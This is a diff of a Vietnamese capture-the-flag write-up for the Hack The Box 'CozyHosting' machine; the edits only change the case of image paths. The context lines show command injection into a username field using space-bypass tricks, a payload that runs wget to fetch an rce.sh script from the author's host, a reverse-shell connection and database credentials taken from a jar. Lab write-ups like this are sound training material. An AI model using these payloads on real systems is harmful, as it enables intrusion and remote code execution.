@@ -135,17 +135,17 @@ Tôi có */actuator/sessions*
 
 Sử dụng burpsuite để chèn sessionID
 
-![burp](/assets/img/2023-10-07-HTB-Cozyhosting/2.png)
+![burp](/assets/img/2023-10-07-HTB-CozyHosting/2.png)
 
-![web](/assets/img/2023-10-07-HTB-Cozyhosting/3.png)
+![web](/assets/img/2023-10-07-HTB-CozyHosting/3.png)
 
 Thử nhập input vào 2 trường và bắt request bằng burp
 
-![command](/assets/img/2023-10-07-HTB-Cozyhosting/4.png)
+![command](/assets/img/2023-10-07-HTB-CozyHosting/4.png)
 
 Ở trường *location* trong response trả về cho tôi kết quả của kết nối. Vậy thì tôi có thể thử command injection để server trả kết quả về cho tôi được không
 
-![space](/assets/img/2023-10-07-HTB-Cozyhosting/5.png)
+![space](/assets/img/2023-10-07-HTB-CozyHosting/5.png)
 
 Thử [bypass without space](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/#bypass-without-space)
 
@@ -153,7 +153,7 @@ Thử [bypass without space](https://swisskyrepo.github.io/PayloadsAllTheThings/
 
 Thử thêm [dấu nháy ngược](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/#inside-a-command)
 
-![ping2](/assets/img/2023-10-07-HTB-Cozyhosting/7.png)
+![ping2](/assets/img/2023-10-07-HTB-CozyHosting/7.png)
 
 Vậy là thành công. Tôi sẽ sử dụng cách này để tải RCE lên máy.
 
@@ -177,7 +177,7 @@ Tiếp theo tải RCE lên máy (IP VPN của tôi đã thay đổi) theo lệnh
 host=10.10.14.65&username=`wget${IFS}http://10.10.14.65:2345/rce.sh${IFS}-P${IFS}/tmp`
 ```
 
-![upload](/assets/img/2023-10-07-HTB-Cozyhosting/8.png)
+![upload](/assets/img/2023-10-07-HTB-CozyHosting/8.png)
 
 Quay lại http server để kiểm tra
 
@@ -261,7 +261,7 @@ connect to [10.10.14.65] from (UNKNOWN) [10.10.11.230] 33940
 
 Sử dụng [jadx | Kali Linux Tools](https://www.kali.org/tools/jadx/) để mở file jar này. Tôi tìm thấy thông tin đăng nhập vào database postgresql
 
-![postgresql](/assets/img/2023-10-07-HTB-Cozyhosting/9.png)
+![postgresql](/assets/img/2023-10-07-HTB-CozyHosting/9.png)
 
 Quay lại RCE để đăng nhập db
 
